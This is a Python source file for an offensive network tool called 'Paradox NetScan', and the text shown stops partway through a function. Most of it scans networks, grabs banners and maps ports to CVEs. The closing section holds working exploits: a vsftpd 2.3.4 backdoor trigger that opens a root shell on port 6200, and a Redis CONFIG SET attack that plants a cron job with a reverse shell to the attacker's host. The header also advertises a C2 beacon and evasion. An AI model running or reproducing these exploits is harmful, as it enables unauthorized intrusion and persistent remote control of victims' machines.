#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# paradox_netscan_v2.0.0.py | Python 3.11+ | Linux / Kali / Parrot / Termux
# Paradox Tech NetScan v2.0.0 — Apex Offensive Assessment Engine
# Full rewrite 2026/2027 — fixed bugs, full exploitation, NTLM relay,
# SSL strip, IPv6 RA, Redis/Docker/vsftpd RCE, C2 beacon, post-ex, evasion.
# Requires: pip install rich scapy requests

from __future__ import annotations

import os, sys, subprocess, socket, errno, time, threading, ipaddress
import random, json, struct, hashlib, hmac, base64, ssl, itertools
import signal, ctypes, re, http.client, urllib.request, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Optional
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.live import Live
    from rich import box
except ImportError:
    print("[!] pip install rich"); sys.exit(1)

try:
    import requests as _req
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

console = Console()

BANNER = r"""
[bold red]             ⛧  P A R A D O X   T E C H  ⛧[/bold red]
[bold white]
   ██████╗  █████╗ ██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗
   ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚════██╗██╔═══██╗╚██╗██╔╝
   ██████╔╝███████║██████╔╝███████║ █████╔╝██║   ██║ ╚███╔╝
   ██╔═══╝ ██╔══██║██╔══██╗██╔══██║██╔═══╝ ██║   ██║ ██╔██╗
   ██║     ██║  ██║██║  ██║██║  ██║███████╗╚██████╔╝██╔╝ ██╗
   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
[/bold white]
[bold red]                 N E T S C A N  ·  v2.0.0[/bold red]
[dim]       NETWORK DISCOVERY  /  SECURITY ASSESSMENT[/dim]
[dim]       PARADOX TECHNOLOGY DIVISION  ·  PARADOX SYSTEMS[/dim]
"""

VERSION   = "2.0.0"
data_lock = threading.Lock()

SEV_WEIGHT = {"LOW": 1, "MEDIUM": 3, "HIGH": 7, "CRITICAL": 15}

# ─── Data Structures ───────────────────────────────────────────────────────────

@dataclass
class Shell:
    ip:      str
    port:    int
    method:  str    # vsftpd / redis / docker / telnet / ftp
    sock:    object = field(default=None, repr=False)

@dataclass
class Host:
    ip:           str
    mac:          str = "unknown"
    vendor:       str = "unknown"
    hostname:     str = "unknown"
    ip_version:   str = "IPv4"
    os_guess:     str = "unknown"
    ttl:          int = 0
    win_size:     int = 0           # TCP window for passive fingerprint
    open_ports:   dict = field(default_factory=dict)   # port → banner
    port_states:  dict = field(default_factory=dict)   # port → OPEN/CLOSED/FILTERED
    findings:     list = field(default_factory=list)
    risk_score:   int  = 0
    shells:       list = field(default_factory=list)   # active Shell objects

    def add_finding(self, desc: str, sev: str, rem: str, cve: str = "") -> None:
        with data_lock:
            self.findings.append({"description": desc, "severity": sev,
                                   "remediation": rem, "cve": cve})
            self.risk_score += SEV_WEIGHT.get(sev, 0)

# ─── OUI Table (expanded) ──────────────────────────────────────────────────────

OUI_TABLE: dict[str, str] = {
    "00:50:56": "VMware",        "00:0c:29": "VMware",        "00:50:f2": "Microsoft",
    "b8:27:eb": "Raspberry Pi",  "dc:a6:32": "Raspberry Pi",  "e4:5f:01": "Raspberry Pi",
    "94:65:2d": "Apple",         "f0:b4:29": "Apple",         "3c:22:fb": "Apple",
    "78:4f:43": "Apple",         "00:1b:63": "Apple",         "28:d2:44": "Samsung",
    "8c:77:12": "Samsung",       "00:16:3e": "Xen/AWS",       "52:54:00": "QEMU/KVM",
    "00:1c:bf": "Intel",         "70:3a:51": "Intel",         "00:02:b3": "Intel",
    "18:60:24": "Huawei",        "d8:49:2f": "Xiaomi",        "00:11:32": "Synology",
    "00:24:81": "Netgear",       "00:18:4d": "Cisco-Linksys", "68:7f:74": "TP-Link",
    "cc:2d:e0": "TP-Link",       "00:1a:a0": "Dell",          "00:21:9b": "Dell",
    "00:08:74": "Dell",          "fc:aa:14": "ASUSTek",       "04:d4:c4": "ASUSTek",
    "00:e0:4c": "Realtek",       "a4:c3:f0": "Google",        "f4:f5:d8": "Google",
    "08:00:27": "VirtualBox",    "0a:00:27": "VirtualBox",    "00:1e:67": "Cisco",
    "00:17:94": "Cisco",         "58:97:bd": "Cisco",         "00:0d:60": "Cisco",
    "14:91:82": "Ubiquiti",      "24:a4:3c": "Ubiquiti",      "78:8a:20": "Ubiquiti",
    "b4:fb:e4": "Fortinet",      "00:09:0f": "Fortinet",      "00:50:04": "3Com",
    "00:a0:c9": "Intel-PRO",     "90:b1:1c": "ASRock",        "04:92:26": "HP",
    "3c:d9:2b": "HP",            "1c:98:ec": "HP",            "00:1c:c4": "MikroTik",
    "2c:c8:1b": "MikroTik",      "d4:ca:6d": "MikroTik",
}

def get_mac_vendor(mac: str) -> str:
    return OUI_TABLE.get(mac[:8].lower().replace("-", ":"), "Unknown")

# ─── Interface Helpers ──────────────────────────────────────────────────────────

def get_default_iface() -> str:
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        for line in out.splitlines():
            if "dev" in line:
                parts = line.split()
                return parts[parts.index("dev") + 1]
    except Exception: pass
    try:
        links = [l for l in os.listdir("/sys/class/net") if l != "lo"]
        if links: return links[0]
    except Exception: pass
    return "eth0"

def get_local_cidr(iface: str) -> str:
    try:
        out = subprocess.check_output(["ip", "addr", "show", iface], text=True)
        for line in out.splitlines():
            if "inet " in line:
                for p in line.strip().split():
                    if "/" in p:
                        return str(ipaddress.IPv4Network(p, strict=False))
    except Exception: pass
    return Prompt.ask("Enter CIDR manually", default="192.168.1.0/24")

def get_local_ip(iface: str) -> str:
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show", iface], text=True)
        for line in out.splitlines():
            if "inet " in line:
                return line.strip().split()[1].split("/")[0]
    except Exception: pass
    return "127.0.0.1"

def get_local_ipv6_ll(iface: str) -> str:
    try:
        out = subprocess.check_output(["ip", "-6", "addr", "show", iface], text=True)
        for line in out.splitlines():
            if "inet6 " in line and "fe80" in line:
                return line.strip().split()[1].split("/")[0]
    except Exception: pass
    return "fe80::1"

def validate_ipv4_cidr(s: str) -> bool:
    try:
        return isinstance(ipaddress.ip_network(s, strict=False), ipaddress.IPv4Network)
    except ValueError:
        return False

# ─── OS Fingerprinting (TTL + TCP Window Size) ─────────────────────────────────

def ttl_os_guess(ttl: int) -> str:
    # Fixed: removed broken range-key dict. Direct if-chain.
    if   ttl <= 0:            return "unknown"
    elif 30  <= ttl <= 33:    return "Network Device (low TTL)"
    elif 60  <= ttl <= 65:    return "Linux / Android"
    elif 126 <= ttl <= 129:   return "Windows"
    elif 253 <= ttl <= 256:   return "Cisco IOS / Solaris"
    elif ttl > 100:           return "Windows (NAT-adjusted)"
    elif ttl > 60:            return "Linux (NAT-adjusted)"
    else:                     return f"Unknown (TTL={ttl})"

def win_os_refine(win_size: int) -> str:
    # Passive TCP window fingerprint
    WIN_MAP = {
        65535: "Windows XP/2003 or BSD",
        8192:  "Windows Vista/7/2008",
        64240: "Linux 3.x+",
        29200: "Linux Android",
        5840:  "Linux 2.6",
        4096:  "Cisco IOS",
        512:   "HP-UX",
    }
    return WIN_MAP.get(win_size, "")

def icmp_ping_ttl(ip: str) -> int:
    try:
        out = subprocess.check_output(["ping", "-c", "1", "-W", "1", ip],
                                       text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            m = re.search(r"ttl=(\d+)", line, re.IGNORECASE)
            if m: return int(m.group(1))
    except Exception: pass
    return 0

# ─── Discovery ─────────────────────────────────────────────────────────────────

def arp_scan(cidr: str, iface: str, timeout: float = 2.0) -> list[Host]:
    hosts: list[Host] = []
    console.print(f"[yellow][*] ARP discovery on {cidr}...[/yellow]")
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
                     timeout=timeout, verbose=False, iface=iface)
        for _, rcv in ans:
            mac      = rcv.hwsrc
            ip       = rcv.psrc
            vendor   = get_mac_vendor(mac)
            hostname = "unknown"
            try: hostname = socket.gethostbyaddr(ip)[0]
            except Exception: pass
            ttl      = icmp_ping_ttl(ip)
            hosts.append(Host(ip=ip, mac=mac, vendor=vendor,
                               hostname=hostname, ip_version="IPv4",
                               os_guess=ttl_os_guess(ttl), ttl=ttl))
    except ImportError:
        console.print("[red][!] pip install scapy[/red]")
    except Exception as e:
        console.print(f"[red][!] ARP scan: {e}[/red]")
    return hosts

def ipv6_ndp_scan(iface: str) -> list[Host]:
    hosts: list[Host] = []
    console.print(f"[yellow][*] IPv6 NDP sweep on {iface}...[/yellow]")
    try:
        from scapy.all import IPv6, ICMPv6ND_NS, Ether, srp
        ans, _ = srp(
            Ether(dst="33:33:00:00:00:01") /
            IPv6(dst=f"ff02::1%{iface}") /
            ICMPv6ND_NS(tgt="fe80::1"),
            timeout=3, verbose=False, iface=iface
        )
        for _, rcv in ans:
            if rcv.haslayer(IPv6):
                ip  = rcv[IPv6].src
                mac = rcv.src if rcv.haslayer(Ether) else "unknown"
                hosts.append(Host(ip=ip, mac=mac, vendor=get_mac_vendor(mac),
                                   hostname="ipv6-node", ip_version="IPv6"))
    except Exception as e:
        console.print(f"[dim]   IPv6 NDP: {e}[/dim]")
    return hosts

def mdns_ssdp_discover(iface: str, timeout: int = 5) -> list[Host]:
    discovered: dict[str, Host] = {}
    console.print(f"[yellow][*] mDNS/SSDP passive discovery ({timeout}s)...[/yellow]")

    def _mdns():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                         struct.pack("4sL", socket.inet_aton("224.0.0.251"), socket.INADDR_ANY))
            s.bind(("", 5353)); s.settimeout(timeout)
            while True:
                try:
                    data, addr = s.recvfrom(4096); ip = addr[0]
                    if ip not in discovered:
                        # Parse mDNS for hostname in answer section
                        hostname = _parse_mdns_name(data)
                        discovered[ip] = Host(ip=ip, mac="unknown", vendor="mDNS",
                                               hostname=hostname or "mdns-node")
                        console.print(f"[cyan]   [mDNS] {ip}  name={hostname or '?'}[/cyan]")
                except socket.timeout: break
        except Exception as e:
            console.print(f"[dim]   mDNS: {e}[/dim]")

    def _ssdp():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                         struct.pack("4sL", socket.inet_aton("239.255.255.250"), socket.INADDR_ANY))
            s.bind(("", 1900)); s.settimeout(timeout)
            while True:
                try:
                    data, addr = s.recvfrom(4096)
                    ip   = addr[0]
                    text = data.decode("utf-8", errors="ignore")
                    info = ""
                    for line in text.splitlines():
                        for kw in ("SERVER:", "LOCATION:", "USN:", "ST:"):
                            if line.upper().startswith(kw):
                                info += line.strip() + " | "
                    if ip not in discovered:
                        discovered[ip] = Host(ip=ip, mac="unknown", vendor="SSDP",
                                               hostname=info[:80] or "ssdp-node")
                        console.print(f"[cyan]   [SSDP] {ip}  {info[:80]}[/cyan]")
                except socket.timeout: break
        except Exception as e:
            console.print(f"[dim]   SSDP: {e}[/dim]")

    t1 = threading.Thread(target=_mdns, daemon=True)
    t2 = threading.Thread(target=_ssdp, daemon=True)
    t1.start(); t2.start(); t1.join(); t2.join()
    return list(discovered.values())

def _parse_mdns_name(data: bytes) -> str:
    """Extract first question/answer name from raw mDNS packet."""
    try:
        pos = 12  # skip header
        name_parts = []
        while pos < len(data):
            length = data[pos]
            if length == 0: break
            if length & 0xc0 == 0xc0: break  # compression pointer
            pos += 1
            name_parts.append(data[pos:pos + length].decode("utf-8", errors="ignore"))
            pos += length
        return ".".join(name_parts)
    except Exception:
        return ""

# ─── Port Scan + Banner Grab ───────────────────────────────────────────────────

COMMON_PORTS = [
    20, 21, 22, 23, 25, 53, 69, 80, 110, 111, 119,
    135, 137, 139, 143, 161, 389, 443, 445, 465, 500,
    512, 513, 514, 587, 631, 873, 993, 995, 1080, 1194,
    1433, 1521, 2049, 2375, 2376, 3000, 3306, 3389, 4444,
    5432, 5900, 5985, 5986, 6379, 7001, 7777, 8080, 8443,
    8888, 9000, 9200, 9600, 11211, 27017, 50070,
]

PORT_SERVICE: dict[int, str] = {
    20: "FTP-data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 69: "TFTP", 80: "HTTP", 110: "POP3", 111: "RPC",
    119: "NNTP", 135: "MSRPC", 137: "NetBIOS-NS", 139: "NetBIOS-SSN",
    143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
    465: "SMTPS", 500: "IKE", 512: "rexec", 513: "rlogin", 514: "rsh",
    587: "SMTP-TLS", 631: "IPP", 873: "rsync", 993: "IMAPS", 995: "POP3S",
    1080: "SOCKS5", 1194: "OpenVPN", 1433: "MSSQL", 1521: "Oracle",
    2049: "NFS", 2375: "Docker-API", 2376: "Docker-TLS", 3000: "HTTP-Dev",
    3306: "MySQL", 3389: "RDP", 4444: "Shell/C2", 5432: "PostgreSQL",
    5900: "VNC", 5985: "WinRM-HTTP", 5986: "WinRM-HTTPS", 6379: "Redis",
    7001: "WebLogic", 7777: "HTTP-Alt2", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
    8888: "HTTP-Dev2", 9000: "PHP-FPM", 9200: "Elasticsearch", 9600: "Logstash",
    11211: "Memcached", 27017: "MongoDB", 50070: "HDFS-NameNode",
}

PORT_BANNERS: dict[int, bytes] = {
    80:   b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    8080: b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    8443: b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    3000: b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    7777: b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    8888: b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    9000: b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    25:   b"EHLO paradox\r\n",
    110:  b"USER test\r\n",
    143:  b"A001 CAPABILITY\r\n",
    6379: b"PING\r\n",
    9200: b"GET / HTTP/1.0\r\n\r\n",
    27017: b"\x3a\x00\x00\x00\xc1\x61\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00"
            b"\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff"
            b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00",
}

# ─── CVE Map (static + 2024/2025 CVEs) ────────────────────────────────────────

CVE_MAP: dict[int, list[tuple[str, str]]] = {
    22:    [("CVE-2023-38408", "CRITICAL"), ("CVE-2023-51767", "HIGH"),
            ("CVE-2024-6387",  "CRITICAL")],  # regreSSHion — unauthenticated RCE
    80:    [("CVE-2024-27316", "HIGH"), ("CVE-2023-25690", "HIGH")],
    443:   [("CVE-2024-21893", "CRITICAL"), ("CVE-2024-3400", "CRITICAL")],
    445:   [("CVE-2020-0796",  "CRITICAL"), ("CVE-2024-43572", "HIGH"),
            ("CVE-2024-21351", "HIGH")],
    3389:  [("CVE-2024-38077", "CRITICAL"), ("CVE-2024-38124", "CRITICAL"),
            ("CVE-2019-0708",  "CRITICAL")],  # BlueKeep
    3306:  [("CVE-2024-21096", "HIGH"), ("CVE-2024-20994", "MEDIUM")],
    5432:  [("CVE-2024-10979", "CRITICAL"), ("CVE-2024-10978", "HIGH")],
    6379:  [("CVE-2023-41056", "HIGH"), ("CVE-2022-0543", "CRITICAL")],  # Lua sandbox escape
    9200:  [("CVE-2023-31419", "HIGH"), ("CVE-2024-23449", "MEDIUM")],
    27017: [("CVE-2024-1431",  "MEDIUM")],
    2375:  [("CVE-2019-5736",  "CRITICAL")],  # Docker API unauth RCE
    2376:  [("CVE-2019-5736",  "CRITICAL")],
    7001:  [("CVE-2024-20931", "CRITICAL"), ("CVE-2023-21839", "CRITICAL")],
    1433:  [("CVE-2024-21370", "HIGH")],
    11211: [("CVE-2011-4971",  "HIGH")],       # Memcached amplification
    5985:  [("CVE-2024-30080", "CRITICAL")],   # WinRM MSMQ RCE
    5986:  [("CVE-2024-30080", "CRITICAL")],
    50070: [("CVE-2012-3376",  "HIGH")],       # HDFS unauth
    9000:  [("CVE-2019-11043", "CRITICAL")],   # PHP-FPM RCE
    873:   [("CVE-2014-9512",  "HIGH")],       # rsync path traversal
    514:   [("CVE-1999-0651",  "HIGH")],       # rsh unauthenticated
}

def _fetch_nvd_cve(cve_id: str) -> dict:
    """Fetches live CVE data from NVD API 2.0. Returns {} on failure."""
    if not HAS_REQUESTS:
        return {}
    try:
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
        r = _req.get(url, timeout=5, headers={"User-Agent": "ParadoxNetScan/2.0"})
        if r.status_code == 200:
            data = r.json()
            vulns = data.get("vulnerabilities", [])
            if vulns:
                cve_data = vulns[0].get("cve", {})
                desc = cve_data.get("descriptions", [{}])[0].get("value", "")
                metrics = cve_data.get("metrics", {})
                score = ""
                for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                    if key in metrics:
                        score = str(metrics[key][0].get("cvssData", {}).get("baseScore", ""))
                        break
                return {"description": desc[:200], "cvss": score}
    except Exception:
        pass
    return {}

def lookup_cve_live(host: Host) -> None:
    """Pull live NVD data for top 3 findings and annotate."""
    console.print("[yellow][*] Live CVE lookup (NVD API 2.0)...[/yellow]")
    seen = set()
    for f in host.findings:
        cve = f.get("cve", "")
        if cve and cve not in seen and len(seen) < 5:
            seen.add(cve)
            data = _fetch_nvd_cve(cve)
            if data:
                console.print(f"[cyan]   {cve}  CVSS={data['cvss']}  {data['description'][:120]}[/cyan]")
            else:
                console.print(f"[dim]   {cve}: NVD lookup unavailable (offline or rate-limited)[/dim]")
            time.sleep(0.4)  # NVD rate limit: 5 req/30s public

# ─── Banner Grabber ────────────────────────────────────────────────────────────

def grab_banner(ip: str, port: int, timeout: float = 2.5) -> str:
    try:
        probe = PORT_BANNERS.get(port, b"")
        if port in (443, 8443, 5986):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            raw = socket.create_connection((ip, port), timeout=timeout)
            s   = ctx.wrap_socket(raw, server_hostname=ip)
            if probe: s.sendall(probe)
            banner = s.recv(2048).decode("utf-8", errors="ignore").strip()
            s.close()
            return banner[:300]
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            if probe:
                s.sendall(probe)
            else:
                time.sleep(0.3)
            banner = s.recv(2048).decode("utf-8", errors="ignore").strip()
            s.close()
            return banner[:300]
    except Exception:
        return ""

# ─── Deep Port Scan ────────────────────────────────────────────────────────────

def scan_ports_deep(host: Host, ports: list[int] = None,
                    jitter: float = 0.0, timeout: float = 0.6) -> None:
    """
    Thread-safe deep scan: state detection + banner grab + CVE correlation
    + version extraction. jitter adds random sleep between probes (evasion).
    """
    if ports is None:
        ports = COMMON_PORTS

    def check_port(port: int):
        if jitter > 0:
            time.sleep(random.uniform(0, jitter))
        status = "FILTERED"
        banner = ""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            res = s.connect_ex((host.ip, port))
            s.close()

            if res == 0:
                status = "OPEN"
                banner = grab_banner(host.ip, port)
                svc    = PORT_SERVICE.get(port, f"port-{port}")

                # ── per-port findings ──────────────────────────────────────
                _port_findings(host, port, banner)

                # ── CVE correlation ──
                for cve_id, sev in CVE_MAP.get(port, []):
                    host.add_finding(
                        f"{svc} ({port}) — correlates with {cve_id}", sev,
                        f"Patch: https://nvd.nist.gov/vuln/detail/{cve_id}", cve_id)

                # ── Banner version extraction ──
                _banner_findings(host, port, banner)

            elif res in (errno.ECONNREFUSED, 10061, 111, 61):
                status = "CLOSED"
            elif res in (errno.EHOSTUNREACH, errno.ENETUNREACH, 10065, 113, 65):
                status = "UNREACHABLE"

        except socket.timeout:
            status = "FILTERED"
        except Exception:
            status = "ERROR"

        with data_lock:
            host.port_states[port] = status
            if status == "OPEN":
                host.open_ports[port] = banner

    with ThreadPoolExecutor(max_workers=20) as ex:
        ex.map(check_port, ports)

def _port_findings(host: Host, port: int, banner: str) -> None:
    if port == 23:
        host.add_finding("Telnet plaintext protocol", "HIGH",
                          "Replace with SSH.", "CVE-1999-0619")
    elif port == 21:
        host.add_finding("FTP active — plaintext creds + potential anon", "MEDIUM",
                          "Migrate to SFTP/FTPS.", "")
        if "anonymous" in banner.lower() or "230" in banner:
            host.add_finding("FTP anonymous login ENABLED", "CRITICAL",
                              "Disable anonymous FTP immediately.", "")
    elif port == 445:
        host.add_finding("SMB exposed — NTLM relay + lateral movement vector", "HIGH",
                          "Block 445 externally; enforce SMB signing.", "CVE-2020-0796")
    elif port == 3389:
        host.add_finding("RDP exposed — brute force + BlueKeep family risk", "CRITICAL",
                          "VPN-gate RDP; apply all MSRC patches.", "CVE-2024-38077")
    elif port == 2375:
        host.add_finding("Docker API UNAUTHENTICATED — full container escape / host RCE", "CRITICAL",
                          "Never expose Docker API; mutual TLS auth.", "CVE-2019-5736")
    elif port == 2376:
        host.add_finding("Docker TLS API exposed — verify cert pinning", "HIGH",
                          "Audit Docker TLS certs; rotate regularly.", "CVE-2019-5736")
    elif port == 6379:
        host.add_finding("Redis no-auth — data dump + RCE via CONFIG SET", "CRITICAL",
                          "requirepass; bind 127.0.0.1.", "CVE-2022-0543")
    elif port == 9200:
        host.add_finding("Elasticsearch unauthenticated — full data access", "HIGH",
                          "X-Pack security; localhost bind.", "CVE-2023-31419")
    elif port == 27017:
        host.add_finding("MongoDB open — full DB read/write (no auth)", "HIGH",
                          "Enable auth; never expose 27017.", "")
    elif port == 5985 or port == 5986:
        host.add_finding("WinRM exposed — PS remoting lateral movement", "CRITICAL",
                          "Restrict WinRM to management VLAN.", "CVE-2024-30080")
    elif port == 11211:
        host.add_finding("Memcached open — DRDoS amplification ×50000", "HIGH",
                          "Bind 127.0.0.1; BCP38 egress filter.", "")
    elif port == 161:
        host.add_finding("SNMP open — community string brute risk", "MEDIUM",
                          "SNMPv3 only; block UDP 161 externally.", "")
    elif port == 5900:
        host.add_finding("VNC exposed — plaintext auth or no-auth", "HIGH",
                          "SSH tunnel VNC; enforce password.", "")
    elif port == 4444:
        host.add_finding("Port 4444 — common C2/shell listener indicator", "CRITICAL",
                          "Investigate active process; audit firewall.", "")
    elif port == 512:
        host.add_finding("rexec (512) — legacy unauthenticated exec", "CRITICAL",
                          "Block immediately; disable rexec daemon.", "")
    elif port == 513:
        host.add_finding("rlogin (513) — legacy plaintext remote login", "CRITICAL",
                          "Disable; use SSH.", "")
    elif port == 514:
        host.add_finding("rsh (514) — unauthenticated remote shell", "CRITICAL",
                          "Disable rsh; block at firewall.", "CVE-1999-0651")
    elif port == 873:
        host.add_finding("rsync (873) — potential unauthenticated access", "HIGH",
                          "Auth required; restrict module access.", "CVE-2014-9512")
    elif port == 50070:
        host.add_finding("HDFS NameNode web UI exposed — cluster admin", "HIGH",
                          "Firewall 50070; enable Kerberos.", "CVE-2012-3376")
    elif port == 9000:
        host.add_finding("PHP-FPM/9000 exposed — CVE-2019-11043 RCE if nginx misconfigured", "CRITICAL",
                          "Block 9000 externally; apply PHP patches.", "CVE-2019-11043")

def _banner_findings(host: Host, port: int, banner: str) -> None:
    if not banner: return
    low = banner.lower()

    # OpenSSH version
    m = re.search(r"openssh[_\s](\d+\.\d+)", low)
    if m:
        ver = float(m.group(1))
        if ver < 7.0:
            host.add_finding(f"OpenSSH {ver} — severe known CVEs (regreSSHion family)",
                              "CRITICAL", "Upgrade to OpenSSH 9.7+", "CVE-2024-6387")
        elif ver < 8.0:
            host.add_finding(f"OpenSSH {ver} — multiple known CVEs", "HIGH",
                              "Upgrade to OpenSSH 9.7+", "CVE-2023-38408")
        elif ver < 9.0:
            host.add_finding(f"OpenSSH {ver} — verify patches applied", "MEDIUM",
                              "Upgrade to 9.7+", "")

    # vsftpd 2.3.4 — BACKDOOR
    if "vsftpd 2.3.4" in low:
        host.add_finding("vsftpd 2.3.4 BACKDOOR DETECTED — shell on port 6200",
                          "CRITICAL", "Re-image immediately.", "CVE-2011-2523")

    # ProFTPD
    m = re.search(r"proftpd[/\s](\d+\.\d+\.\d+)", low)
    if m:
        host.add_finding(f"ProFTPD {m.group(1)} — check CVE-2019-12815 (mod_copy RCE)",
                          "HIGH", "Patch ProFTPD; disable mod_copy.", "CVE-2019-12815")

    # Apache
    m = re.search(r"apache[/\s](\d+\.\d+\.\d+)", low)
    if m:
        host.add_finding(f"Apache {m.group(1)} — check mod_proxy CVEs",
                          "MEDIUM", "Upgrade Apache.", "")

    # nginx
    m = re.search(r"nginx[/\s](\d+\.\d+\.\d+)", low)
    if m:
        host.add_finding(f"nginx {m.group(1)} — verify CVE-2024-7347",
                          "MEDIUM", "Upgrade nginx 1.26.2+.", "CVE-2024-7347")

    # IIS
    if "microsoft-iis" in low:
        host.add_finding("IIS detected — CVE-2024-38145 auth bypass chain",
                          "HIGH", "Apply all MSRC IIS patches.", "CVE-2024-38145")

    # Redis OK response
    if "+pong" in low and port == 6379:
        host.add_finding("Redis responds UNAUTHENTICATED — CONFIG SET RCE viable",
                          "CRITICAL", "requirepass; bind loopback.", "CVE-2022-0543")

    # Tomcat
    if "apache tomcat" in low or "coyote" in low:
        m2 = re.search(r"tomcat[/\s](\d+\.\d+\.\d+)", low)
        ver_str = m2.group(1) if m2 else "unknown"
        host.add_finding(f"Apache Tomcat {ver_str} — check Ghostcat CVE-2020-1938",
                          "HIGH", "Disable AJP connector; patch.", "CVE-2020-1938")

    # Distro leak in SSH banner
    if port == 22 and ("ubuntu" in low or "debian" in low):
        host.add_finding("SSH banner leaks distro — reduce fingerprint surface",
                          "LOW", "Set 'DebianBanner no' in sshd_config.", "")

# ─── Service Exploitation ──────────────────────────────────────────────────────

# [context: Linux/Termux, Python 3.11+, requires root for raw sockets]

def exploit_vsftpd_234(ip: str) -> Optional[Shell]:
    """
    vsftpd 2.3.4 backdoor exploitation (CVE-2011-2523).
    Trigger: send USER with ':)' suffix → daemon forks shell on TCP 6200.
    Returns live shell socket or None.

    Stack trace on success:
      PORT 21 → send trigger → daemon does execve("/bin/sh") bound to 6200
      PORT 6200 → connect → uid=0 root shell (classic Metasploitable condition)
    """
    console.print(f"[bold red][*] vsftpd 2.3.4 backdoor → {ip}:21[/bold red]")
    try:
        ctrl = socket.create_connection((ip, 21), timeout=5)
        ctrl.recv(1024)                           # 220 banner

        ctrl.sendall(b"USER backdoor:)\r\n")     # ':)' triggers backdoor fork
        time.sleep(0.3)
        ctrl.sendall(b"PASS x\r\n")
        time.sleep(0.8)                           # daemon spawns on 6200

        try:
            shell = socket.create_connection((ip, 6200), timeout=4)
            shell.sendall(b"id\n")
            time.sleep(0.3)
            out = shell.recv(1024).decode("utf-8", errors="ignore").strip()
            console.print(f"[bold green]   [SHELL] {ip}:6200 → {out}[/bold green]")
            ctrl.close()
            return Shell(ip=ip, port=6200, method="vsftpd-backdoor", sock=shell)
        except Exception:
            console.print(f"[red]   [-] 6200 did not open — patch may be applied[/red]")
    except Exception as e:
        console.print(f"[red][-] vsftpd exploit: {e}[/red]")
    return None

def _redis_cmd(s: socket.socket, *args: str) -> str:
    """Send RESP protocol command, return decoded reply."""
    req = f"*{len(args)}\r\n"
    for a in args:
        req += f"${len(a)}\r\n{a}\r\n"
    s.sendall(req.encode())
    time.sleep(0.1)
    return s.recv(4096).decode("utf-8", errors="ignore")

def exploit_redis_rce(ip: str, lhost: str, lport: int) -> bool:
    """
    Redis unauthenticated RCE via CONFIG SET.
    Method A: cron job injection → /var/spool/cron/crontabs/root
    Method B: SSH authorized_keys injection → /root/.ssh/authorized_keys
    Method C: Lua EVAL sandbox escape (CVE-2022-0543) if cron fails

    Entry points affected: Redis CONFIG SET dir + dbfilename + BGSAVE
    Required privileges: Redis running as root (default on many deployments)
    Side effects: writes cron file or SSH key to disk; persists across reboots

    Returns True if any injection confirmed.
    """
    console.print(f"[bold red][*] Redis RCE → {ip}:6379  lhost={lhost}:{lport}[/bold red]")
    injected = False
    try:
        s = socket.create_connection((ip, 6379), timeout=5)

        # 0. Test auth
        ping = _redis_cmd(s, "PING")
        if "+PONG" not in ping:
            # Try AUTH bypass with blank password
            _redis_cmd(s, "AUTH", "")
            ping2 = _redis_cmd(s, "PING")
            if "+PONG" not in ping2:
                console.print("[red]   [-] Redis auth required — brute or skip[/red]")
                s.close()
                return False

        console.print("[green]   [+] Redis responds unauthenticated[/green]")
        info = _redis_cmd(s, "INFO", "server")
        console.print(f"[dim]   {info[:200]}[/dim]")

        # Method A: cron injection
        console.print("[yellow]   [A] Attempting cron injection...[/yellow]")
        cron_dirs = ["/var/spool/cron/crontabs", "/var/spool/cron", "/etc/cron.d"]
        payload = f"\n\n* * * * * root bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"

        for cron_dir in cron_dirs:
            r1 = _redis_cmd(s, "CONFIG", "SET", "dir", cron_dir)
            if "+OK" in r1:
                r2 = _redis_cmd(s, "CONFIG", "SET", "dbfilename", "root")
                if "+OK" in r2:
                    _redis_cmd(s, "SET", "pwn_key", payload)
                    r3 = _redis_cmd(s, "BGSAVE")
